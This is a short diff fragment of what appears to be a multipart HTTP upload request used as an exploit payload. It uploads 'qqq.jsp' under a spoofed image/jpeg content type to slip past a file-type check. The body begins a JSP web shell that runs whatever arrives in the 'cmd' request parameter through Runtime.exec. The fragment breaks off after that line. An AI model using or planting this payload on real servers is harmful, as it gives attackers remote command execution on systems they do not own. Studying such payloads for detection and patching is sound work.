@@ -3,6 +3,7 @@ Content-Disposition: form-data; name="file"; filename="qqq.jsp"
 Content-Type: image/jpeg
 
 
+
 <%
 
 java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
